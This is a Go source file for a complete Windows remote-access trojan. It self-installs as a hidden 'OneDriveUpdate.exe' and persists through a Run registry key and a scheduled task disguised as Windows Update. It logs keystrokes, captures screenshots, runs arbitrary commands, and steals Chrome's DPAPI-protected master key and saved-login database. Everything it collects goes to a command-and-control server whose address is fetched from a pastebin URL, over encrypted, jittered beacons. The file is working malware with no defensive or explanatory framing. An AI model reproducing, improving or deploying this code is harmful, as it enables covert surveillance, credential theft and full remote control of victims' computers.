package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	"golang.org/x/crypto/hkdf"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var RESOLVER_URL = "https://pastebin.com/raw/PNFkyRKV"
var C2_ADDRESS = ""
var SLEEP_TIME = 5 * time.Second
var JITTER = 0.3
var USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"

var staticKeyHex string // set via -ldflags "-X main.staticKeyHex=..."
var STATIC_KEY []byte
var SESSION_KEY []byte

var certPinHex string // set via -ldflags "-X main.certPinHex=..."
var CERT_PIN string
var C2_TRANSPORT *http.Transport

var AGENT_ID = ""

var MUTEX_NAME = "Global\\MySecretMalwareMutex_v3"
var mutexHandle windows.Handle
var INSTALL_NAME = "OneDriveUpdate.exe"

var (
	modcrypt32                = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotectData    = modcrypt32.NewProc("CryptUnprotectData")
	user32                    = syscall.NewLazyDLL("user32.dll")
	procSetWindowsHookExW     = user32.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx   = user32.NewProc("UnhookWindowsHookEx")
	procCallNextHookEx        = user32.NewProc("CallNextHookEx")
	procGetMessageW           = user32.NewProc("GetMessageW")
	procGetForegroundWindow   = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW        = user32.NewProc("GetWindowTextW")
)

type KBDLLHOOKSTRUCT struct {
	vkCode      uint32
	scanCode    uint32
	flags       uint32
	time        uint32
	dwExtraInfo uintptr
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

type LocalState struct {
	OsCrypt struct {
		EncryptedKey string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

type Task struct {
	Type        string `json:"type"`
	Command     string `json:"command"`
	Path        string `json:"path"`
	FileData    string `json:"file_data"`
	Destination string `json:"destination"`
	PublicKey   string `json:"public_key,omitempty"`
}

type Result struct {
	Type     string   `json:"type"`
	Data     string   `json:"data"`
	Filename string   `json:"filename,omitempty"`
	Keylogs  string   `json:"keylogs,omitempty"`
	Errors   []string `json:"errors,omitempty"`
}

var ERROR_QUEUE []string
var ERROR_QUEUE_MUTEX sync.Mutex
const MAX_ERROR_QUEUE = 10

type HandshakeResponse struct {
	Status    string `json:"status"`
	PublicKey string `json:"public_key"`
}

func init() {
	if staticKeyHex == "" {
		STATIC_KEY = make([]byte, 32)
		rand.Read(STATIC_KEY)
	} else {
		var err error
		STATIC_KEY, err = hex.DecodeString(staticKeyHex)
		if err != nil || len(STATIC_KEY) != 32 {
			STATIC_KEY = make([]byte, 32)
			rand.Read(STATIC_KEY)
		}
	}

	if certPinHex != "" {
		CERT_PIN = certPinHex
	}

	C2_TRANSPORT = &http.Transport{
		TLSClientConfig: &tls.Config{
			VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
				if CERT_PIN == "" {
					return nil
				}
				for _, raw := range rawCerts {
					digest := sha256.Sum256(raw)
					if hex.EncodeToString(digest[:]) == CERT_PIN {
						return nil
					}
				}
				return fmt.Errorf("cert pin mismatch")
			},
		},
	}
}

func main() {
	installSelf()

	if !checkForMutex() {
		os.Exit(0)
	}

	AGENT_ID = generateAgentID()

	installRegistryPersistence()
	installScheduledTask()

	performHandshake()

	go startKeylogger()

	for {
		beacon()
		sleepWithJitter()
	}
}

var KEYLOG_BUFFER bytes.Buffer
var KEYLOG_MUTEX sync.Mutex
var LAST_WINDOW = ""

func keyboardHookProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	const WM_KEYDOWN = 0x0100
	const WM_SYSKEYDOWN = 0x0104

	if nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		kbd := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		activeWindow := getActiveWindow()
		if activeWindow != LAST_WINDOW {
			KEYLOG_MUTEX.Lock()
			KEYLOG_BUFFER.WriteString(fmt.Sprintf("\n[%s]\n", activeWindow))
			KEYLOG_MUTEX.Unlock()
			LAST_WINDOW = activeWindow
		}
		key := mapKey(int(kbd.vkCode))
		if len(key) > 0 {
			KEYLOG_MUTEX.Lock()
			KEYLOG_BUFFER.WriteString(key)
			KEYLOG_MUTEX.Unlock()
		}
	}
	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

func startKeylogger() {
	const WH_KEYBOARD_LL = 13

	hook, _, _ := procSetWindowsHookExW.Call(
		uintptr(WH_KEYBOARD_LL),
		syscall.NewCallback(keyboardHookProc),
		0,
		0,
	)
	if hook == 0 {
		return
	}
	defer procUnhookWindowsHookEx.Call(hook)

	var msg struct {
		hwnd    uintptr
		message uint32
		wParam  uintptr
		lParam  uintptr
		time    uint32
		ptX     int32
		ptY     int32
	}
	for {
		procGetMessageW.Call(
			uintptr(unsafe.Pointer(&msg)),
			0, 0, 0,
		)
	}
}

func getActiveWindow() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}
	buf := make([]uint16, 256)
	procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 256)
	return syscall.UTF16ToString(buf)
}

func mapKey(vkCode int) string {
	if vkCode >= 0x30 && vkCode <= 0x5A {
		return string(rune(vkCode))
	}
	switch vkCode {
	case 0x0D:
		return "\n"
	case 0x20:
		return " "
	case 0x08:
		return "[BS]"
	default:
		return ""
	}
}

func installSelf() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	appData, err := os.UserConfigDir()
	if err != nil {
		return
	}
	destPath := filepath.Join(appData, INSTALL_NAME)

	if strings.EqualFold(exePath, destPath) {
		return
	}

	srcFile, err := os.ReadFile(exePath)
	if err != nil {
		return
	}
	err = os.WriteFile(destPath, srcFile, 0644)
	if err != nil {
		return
	}

	ptr, _ := syscall.UTF16PtrFromString(destPath)
	attributes, _ := syscall.GetFileAttributes(ptr)
	syscall.SetFileAttributes(ptr, attributes|syscall.FILE_ATTRIBUTE_HIDDEN)

	cmd := exec.Command(destPath)
	cmd.Start()
	os.Exit(0)
}

func checkForMutex() bool {
	name, _ := windows.UTF16PtrFromString(MUTEX_NAME)
	handle, err := windows.CreateMutex(nil, false, name)
	if err != nil {
		return false
	}
	err = windows.GetLastError()
	if err == windows.ERROR_ALREADY_EXISTS {
		return false
	}
	mutexHandle = handle
	return true
}

func releaseMutex() {
	if mutexHandle != 0 {
		windows.CloseHandle(mutexHandle)
	}
}

func installRegistryPersistence() {
	appData, _ := os.UserConfigDir()
	destPath := filepath.Join(appData, INSTALL_NAME)

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		return
	}
	defer key.Close()

	existing, _, _ := key.GetStringValue("WindowsUpdateService")
	if existing == destPath {
		return
	}
	key.SetStringValue("WindowsUpdateService", destPath)
}

func installScheduledTask() {
	appData, _ := os.UserConfigDir()
	destPath := filepath.Join(appData, INSTALL_NAME)

	queryCmd := exec.Command("schtasks", "/query", "/tn", "WindowsUpdateCheck")
	queryCmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	if queryCmd.Run() == nil {
		return
	}

	minutes := 2
	cmd := exec.Command("schtasks", "/create", "/sc", "minute", "/mo", fmt.Sprintf("%d", minutes), "/tn", "WindowsUpdateCheck", "/tr", destPath, "/f", "/np")
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd.Run()
}

func uninstallPersistence() error {
	var errMsgs []string
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err == nil {
		if err := key.DeleteValue("WindowsUpdateService"); err != nil {
			errMsgs = append(errMsgs, fmt.Sprintf("Reg: %v", err))
		}
		key.Close()
	}
	cmd := exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f")
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	if err := cmd.Run(); err != nil {
		errMsgs = append(errMsgs, fmt.Sprintf("Task: %v", err))
	}
	if len(errMsgs) > 0 {
		return fmt.Errorf(strings.Join(errMsgs, "; "))
	}
	return nil
}

func generateAgentID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func queueError(tag string) {
	ERROR_QUEUE_MUTEX.Lock()
	defer ERROR_QUEUE_MUTEX.Unlock()
	if len(ERROR_QUEUE) < MAX_ERROR_QUEUE {
		ERROR_QUEUE = append(ERROR_QUEUE, tag)
	}
}

func drainErrors() []string {
	ERROR_QUEUE_MUTEX.Lock()
	defer ERROR_QUEUE_MUTEX.Unlock()
	if len(ERROR_QUEUE) == 0 {
		return nil
	}
	errs := ERROR_QUEUE
	ERROR_QUEUE = nil
	return errs
}

func attachErrors(res Result) Result {
	res.Errors = drainErrors()
	return res
}

func resolveC2() string {
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Get(RESOLVER_URL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(body))
}

func performHandshake() {
	if C2_ADDRESS == "" {
		C2_ADDRESS = resolveC2()
		if C2_ADDRESS == "" {
			return
		}
	}

	curve := ecdh.P256()
	privKey, err := curve.GenerateKey(rand.Reader)
	if err != nil {
		queueError("handshake_keygen")
		return
	}
	pubKey := privKey.PublicKey()

	packet := Task{
		Type:      "handshake",
		PublicKey: base64.StdEncoding.EncodeToString(pubKey.Bytes()),
	}
	jsonPacket, err := json.Marshal(packet)
	if err != nil {
		queueError("handshake_marshal")
		return
	}

	encryptedPacket, err := EncryptStatic(string(jsonPacket))
	if err != nil {
		queueError("handshake_encrypt")
		return
	}

	client := &http.Client{Timeout: 10 * time.Second, Transport: C2_TRANSPORT}
	req, err := http.NewRequest("POST", C2_ADDRESS, bytes.NewBuffer([]byte(encryptedPacket)))
	if err != nil {
		queueError("handshake_req")
		return
	}
	req.Header.Set("User-Agent", USER_AGENT)
	req.Header.Set("ngrok-skip-browser-warning", "true")
	req.Header.Set("X-Agent-ID", AGENT_ID)

	resp, err := client.Do(req)
	if err != nil {
		queueError("handshake_conn")
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		queueError("handshake_read")
		return
	}
	decryptedResp, err := DecryptStatic(string(bodyBytes))
	if err != nil {
		queueError("handshake_decrypt")
		return
	}

	var handshakeResp HandshakeResponse
	json.Unmarshal([]byte(decryptedResp), &handshakeResp)

	serverPubBytes, err := base64.StdEncoding.DecodeString(handshakeResp.PublicKey)
	if err != nil {
		queueError("handshake_pubkey")
		return
	}
	serverPub, err := curve.NewPublicKey(serverPubBytes)
	if err != nil {
		queueError("handshake_pubkey")
		return
	}

	sharedSecret, err := privKey.ECDH(serverPub)
	if err != nil {
		queueError("handshake_ecdh")
		return
	}

	hkdfReader := hkdf.New(sha256.New, sharedSecret, nil, []byte("handshake data"))
	derivedKey := make([]byte, 32)
	if _, err := io.ReadFull(hkdfReader, derivedKey); err != nil {
		queueError("handshake_hkdf")
		return
	}

	SESSION_KEY = derivedKey
}

func beacon() {
	if C2_ADDRESS == "" {
		C2_ADDRESS = resolveC2()
		if C2_ADDRESS == "" {
			return
		}
	}
	client := &http.Client{Timeout: 30 * time.Second, Transport: C2_TRANSPORT}

	req, err := http.NewRequest("GET", C2_ADDRESS, nil)
	if err != nil {
		C2_ADDRESS = ""
		return
	}
	req.Header.Set("User-Agent", USER_AGENT)
	req.Header.Set("ngrok-skip-browser-warning", "true")
	req.Header.Set("X-Agent-ID", AGENT_ID)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Conn Error")
		C2_ADDRESS = ""
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			queueError("beacon_read")
			return
		}
		encryptedTask := string(bodyBytes)
		decryptedJson, err := Decrypt(encryptedTask)
		if err != nil {
			queueError("beacon_decrypt")
			return
		}

		var task Task
		json.Unmarshal([]byte(decryptedJson), &task)

		KEYLOG_MUTEX.Lock()
		var keylogs string
		if KEYLOG_BUFFER.Len() > 0 {
			keylogs = KEYLOG_BUFFER.String()
			KEYLOG_BUFFER.Reset()
		}
		KEYLOG_MUTEX.Unlock()

		if task.Type == "harvest" {
			harvestCredentials()
			if keylogs != "" {
				res := Result{Type: "keylog", Data: keylogs}
				res = attachErrors(res)
				jsonResult, err := json.Marshal(res)
				if err == nil {
					encryptedResult, err := Encrypt(string(jsonResult))
					if err == nil {
						postResult(encryptedResult)
					}
				}
			}
		} else {
			result := handleTask(task)
			if keylogs != "" {
				result.Keylogs = keylogs
			}
			result = attachErrors(result)
			jsonResult, err := json.Marshal(result)
			if err != nil {
				queueError("beacon_marshal")
				return
			}
			encryptedResult, err := Encrypt(string(jsonResult))
			if err != nil {
				queueError("beacon_encrypt")
				return
			}
			postResult(encryptedResult)
		}

		if task.Type == "uninstall" {
			releaseMutex()
			os.Exit(0)
		}
	} else if resp.StatusCode == 204 {
		fmt.Print(".")
	}
}

func handleTask(task Task) Result {
	res := Result{Type: "text", Data: ""}
	switch task.Type {
	case "exec":
		out, err := runCommand(task.Command)
		if err != nil {
			res.Data = fmt.Sprintf("Error: %s", err)
		} else {
			if len(out) == 0 {
				res.Data = "[+] Executed (No Output)"
			} else {
				res.Data = out
			}
		}
	case "cd":
		err := os.Chdir(task.Path)
		if err != nil {
			res.Data = fmt.Sprintf("Error: %s", err)
		} else {
			cwd, _ := os.Getwd()
			res.Data = fmt.Sprintf("Changed to: %s", cwd)
		}
	case "upload":
		data, err := base64.StdEncoding.DecodeString(task.FileData)
		if err != nil {
			res.Data = fmt.Sprintf("B64 Error: %s", err)
		} else {
			err = os.WriteFile(task.Destination, data, 0644)
			if err != nil {
				res.Data = fmt.Sprintf("Write Error: %s", err)
			} else {
				res.Data = fmt.Sprintf("Uploaded to: %s", task.Destination)
			}
		}
	case "download":
		data, err := os.ReadFile(task.Path)
		if err != nil {
			res.Data = fmt.Sprintf("Read Error: %s", err)
		} else {
			res.Type = "file"
			res.Filename = filepath.Base(task.Path)
			res.Data = base64.StdEncoding.EncodeToString(data)
		}
	case "uninstall":
		err := uninstallPersistence()
		if err != nil {
			res.Data = fmt.Sprintf("Cleanup Errors: %s", err)
		} else {
			res.Data = "Persistence removed. Terminating..."
		}
	case "screenshot":
		n := screenshot.NumActiveDisplays()
		if n <= 0 {
			res.Data = "No active displays."
		} else {
			bounds := screenshot.GetDisplayBounds(0)
			img, err := screenshot.CaptureRect(bounds)
			if err != nil {
				res.Data = fmt.Sprintf("Fail: %s", err)
			} else {
				var buf bytes.Buffer
				png.Encode(&buf, img)
				res.Type = "file"
				res.Filename = fmt.Sprintf("screen_%d.png", time.Now().Unix())
				res.Data = base64.StdEncoding.EncodeToString(buf.Bytes())
			}
		}
	}
	return res
}

func harvestCredentials() {
	userDir, err := os.UserCacheDir()
	if err != nil {
		sendErrorLog("Failed to find AppData Local")
		return
	}

	logMsg := "Harvest Report:\n"

	localStatePath := filepath.Join(userDir, "Google", "Chrome", "User Data", "Local State")
	masterKey, err := getMasterKey(localStatePath)
	if err == nil {
		res := Result{Type: "file", Filename: "master_key.bin", Data: base64.StdEncoding.EncodeToString(masterKey)}
		jsonResult, err := json.Marshal(res)
		if err == nil {
			encryptedResult, err := Encrypt(string(jsonResult))
			if err == nil {
				postResult(encryptedResult)
			} else {
				queueError("harvest_master_encrypt")
			}
		} else {
			queueError("harvest_master_marshal")
		}
		logMsg += "[+] Master Key: Found & Sent\n"
	} else {
		logMsg += fmt.Sprintf("[-] Master Key Error: %s\n", err)
	}

	loginDataPath := filepath.Join(userDir, "Google", "Chrome", "User Data", "Default", "Login Data")
	if _, err := os.Stat(loginDataPath); os.IsNotExist(err) {
		loginDataPath = filepath.Join(userDir, "Google", "Chrome", "User Data", "Profile 1", "Login Data")
	}

	if _, err := os.Stat(loginDataPath); os.IsNotExist(err) {
		logMsg += fmt.Sprintf("[-] Login DB Error: File not found at Default or Profile 1\n")
	} else {
		tempPath := filepath.Join(os.TempDir(), "db_copy.tmp")
		if err := copyFile(loginDataPath, tempPath); err == nil {
			dbData, err := os.ReadFile(tempPath)
			if err == nil {
				res := Result{Type: "file", Filename: "Login Data", Data: base64.StdEncoding.EncodeToString(dbData)}
				jsonResult, err := json.Marshal(res)
				if err == nil {
					encryptedResult, err := Encrypt(string(jsonResult))
					if err == nil {
						postResult(encryptedResult)
					} else {
						queueError("harvest_login_encrypt")
					}
				} else {
					queueError("harvest_login_marshal")
				}
			} else {
				queueError("harvest_login_read")
			}
			logMsg += "[+] Login DB: Found & Sent\n"
			os.Remove(tempPath)
		} else {
			logMsg += fmt.Sprintf("[-] Login DB Copy Error: %s\n", err)
		}
	}

	sendErrorLog(logMsg)
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

func getMasterKey(path string) ([]byte, error) {
	jsonFile, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var state LocalState
	json.Unmarshal(jsonFile, &state)
	encryptedKey, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	encryptedKey = encryptedKey[5:]
	return decryptDPAPI(encryptedKey)
}

func decryptDPAPI(data []byte) ([]byte, error) {
	var outBlob DATA_BLOB
	var inBlob DATA_BLOB
	inBlob.cbData = uint32(len(data))
	inBlob.pbData = &data[0]
	ret, _, _ := procCryptUnprotectData.Call(uintptr(unsafe.Pointer(&inBlob)), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
	if ret == 0 {
		return nil, fmt.Errorf("decryption failed")
	}
	defer windows.LocalFree(windows.Handle(unsafe.Pointer(outBlob.pbData)))
	decrypted := make([]byte, outBlob.cbData)
	copy(decrypted, (*[1 << 30]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData])
	return decrypted, nil
}

func sendErrorLog(msg string) {
	result := Result{Type: "text", Data: msg}
	result = attachErrors(result)
	jsonResult, err := json.Marshal(result)
	if err != nil {
		queueError("sendlog_marshal")
		return
	}
	encryptedResult, err := Encrypt(string(jsonResult))
	if err != nil {
		queueError("sendlog_encrypt")
		return
	}
	postResult(encryptedResult)
}

func postResult(encryptedData string) {
	client := &http.Client{Timeout: 30 * time.Second, Transport: C2_TRANSPORT}
	req, err := http.NewRequest("POST", C2_ADDRESS, bytes.NewBuffer([]byte(encryptedData)))
	if err != nil {
		queueError("post_req")
		return
	}
	req.Header.Set("User-Agent", USER_AGENT)
	req.Header.Set("ngrok-skip-browser-warning", "true")
	req.Header.Set("X-Agent-ID", AGENT_ID)
	client.Do(req)
}

func runCommand(cmd string) (string, error) {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd)
		c.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	} else {
		c = exec.Command("sh", "-c", cmd)
	}
	output, err := c.CombinedOutput()
	return string(output), err
}

func sleepWithJitter() {
	n, _ := rand.Int(rand.Reader, big.NewInt(100))
	drift := float64(SLEEP_TIME) * JITTER
	randomDrift := (float64(n.Int64()) / 100.0 * 2 * drift) - drift
	time.Sleep(time.Duration(float64(SLEEP_TIME) + randomDrift))
}

func EncryptStatic(text string) (string, error) {
	block, err := aes.NewCipher(STATIC_KEY)
	if err != nil {
		return "", err
	}
	return encryptCommon(text, block)
}

func DecryptStatic(cryptoText string) (string, error) {
	block, err := aes.NewCipher(STATIC_KEY)
	if err != nil {
		return "", err
	}
	return decryptCommon(cryptoText, block)
}

func Encrypt(text string) (string, error) {
	key := STATIC_KEY
	if len(SESSION_KEY) > 0 {
		key = SESSION_KEY
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	return encryptCommon(text, block)
}

func Decrypt(cryptoText string) (string, error) {
	key := STATIC_KEY
	if len(SESSION_KEY) > 0 {
		key = SESSION_KEY
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	return decryptCommon(cryptoText, block)
}

func encryptCommon(text string, block cipher.Block) (string, error) {
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, []byte(text), nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decryptCommon(cryptoText string, block cipher.Block) (string, error) {
	data, err := base64.StdEncoding.DecodeString(cryptoText)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return "", fmt.Errorf("too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}
	return string(plaintext), nil
}